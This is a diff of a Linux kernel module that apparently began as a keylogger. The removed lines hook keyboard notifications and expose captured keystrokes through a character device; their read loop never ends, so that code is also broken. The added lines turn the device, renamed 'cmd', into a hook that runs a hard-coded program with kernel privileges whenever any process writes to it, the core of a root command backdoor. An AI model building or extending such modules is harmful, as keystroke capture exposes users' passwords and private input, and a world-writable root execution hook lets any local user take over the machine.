@@ -7,22 +7,17 @@
 #include <linux/cdev.h>
 #include <linux/kdev_t.h>
 #include <linux/version.h>
-#include <linux/keyboard.h>
 
 #include <asm/uaccess.h>
 
-#define DEV_NAME "chardev"    // Name as it appears in /proc/devices
-#define BUF_LEN 80
+#define DEV_NAME "cmd"    // Name as it appears in /proc/devices
 #define DEVICE_CNT 1
 
 static dev_t dev;
 static struct class *cl;
 static struct cdev c_dev;
 
-
 static int Device_Open = 0;
-
-static char prev_key;
 
 // Fill callback structs
 static int device_open(struct inode *, struct file *);
@@ -34,19 +29,6 @@ static struct file_operations fops = {
     .write = device_write,
     .open = device_open,
     .release = device_release,
-};
-int key_notify(struct notifier_block *nblock, unsigned long code, void *_param);
-static struct notifier_block nb = {
-    .notifier_call = key_notify
-};
-
-// Map keycodes to keys, subtract 1 from keycode before indexing (Esc = 1)
-// 16 per line!
-static char scanmap[55] = {
-    'E', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', 'B', 'T', 'q', 'w',
-    'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', 'C', 'a', 's', 'd', 'f',
-    'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 'L', 'z', 'x', 'c', 'v', 'b', 'n', 'm',
-    ',', '.', '/', 'R', '?', 'A', ' '
 };
 
 /* Called when module is loaded.
@@ -81,7 +63,6 @@ static int __init keylog_init(void)
     }
 
     // Register keyboard notifier
-    register_keyboard_notifier(&nb);
     return 0;
 error3:
     device_destroy(cl, dev);
@@ -100,28 +81,6 @@ static void __exit keylog_exit(void)
     device_destroy(cl, dev);
     class_destroy(cl);
     unregister_chrdev_region(dev, DEVICE_CNT);
-    unregister_keyboard_notifier(&nb);
-}
-
-/* Called from notify block when a key is pressed.
- */
-int key_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
-    struct keyboard_notifier_param *param = _param;
-    struct vc_data *vc = param->vc;
-
-    int ret = NOTIFY_OK;
-
-    if (code == KBD_KEYCODE) {
-        if (param->down) {
-            if (param->value >= 55) {
-                prev_key = '?';
-            } else {
-                prev_key = scanmap[param->value - 1];
-            }
-        }
-    }
-
-    return ret;
 }
 
 /* Called when a process tries to open the device file.
@@ -155,15 +114,8 @@ static int device_release(struct inode *inode, struct file *file)
 static ssize_t device_read(struct file *file_ptr, char *buffer,
                            size_t length, loff_t *offset)
 {
-    int bytes_read = 0;
-
-    while (length) {
-        // Copy from kernel data segment to user data segment
-        put_user(prev_key, buffer++);
-        bytes_read++;
-    }
-
-    return bytes_read;
+    printk(KERN_ALERT "Sorry, this operation isn't supported.\n");
+    return -EINVAL;
 }
 
 /* Called when a process tries to write to the device file.
@@ -172,8 +124,16 @@ static ssize_t device_read(struct file *file_ptr, char *buffer,
 static ssize_t device_write(struct file* file_ptr, const char *buff,
                             size_t len, loff_t *off)
 {
-    printk(KERN_ALERT "Sorry, this operation isn't supported.\n");
-    return -EINVAL;
+    char *argv[] = { "/usr/bin/touch", "/test", NULL };
+
+    char *envp[4];
+    envp[0] = "HOME=/";
+    envp[1] = "TERM=linux";
+    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
+    envp[3] = NULL;
+
+    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    return 0;
 }
 
 module_init(keylog_init);
